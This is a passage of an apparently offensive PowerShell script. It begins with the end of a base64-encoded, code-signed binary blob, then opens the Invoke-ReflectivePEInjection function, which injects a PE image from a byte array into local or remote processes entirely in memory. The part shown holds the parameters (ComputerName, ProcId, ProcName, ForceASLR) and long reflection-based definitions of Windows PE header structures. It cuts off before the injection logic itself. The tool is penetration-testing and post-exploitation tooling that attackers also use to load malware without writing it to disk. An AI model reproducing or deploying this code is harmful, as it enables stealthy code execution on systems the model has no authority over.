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"
 
function Invoke-ReflectivePEInjection
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
